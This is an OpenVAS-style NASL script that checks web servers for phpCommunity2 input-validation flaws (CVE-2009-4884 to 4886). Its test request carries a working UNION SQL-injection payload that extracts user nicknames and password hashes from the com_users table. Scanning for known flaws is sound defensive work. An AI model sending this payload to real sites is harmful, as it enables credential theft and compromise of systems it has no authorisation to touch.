if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100041" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)" );
	script_cve_id( "CVE-2009-4884", "CVE-2009-4885", "CVE-2009-4886" );
	script_bugtraq_id( 34056 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "phpCommunity2 Multiple Remote Input Validation Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "phpCommunity2 is prone to multiple input-validation vulnerabilities,
  including multiple directory-traversal issues and SQL-injection issues,
  and a cross-site scripting issue.

  Exploiting these issues could allow an attacker to view arbitrary
  local files within the context of the webserver, steal cookie-based
  authentication credentials, compromise the application, access or
  modify data, or exploit latent vulnerabilities in the underlying
  database." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34056/" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/phpcom", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/index.php?n=guest&c=0&m=search&s=forum&wert=-1%25%22%20UNION%20ALL%20SELECT%201,2,3,4,CONCAT(nick,%200x3a,%20pwd),6%20FROM%20com_users%23" );
	if(http_vuln_check( port: port, url: url, pattern: "admin:[a-f0-9]{32}" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

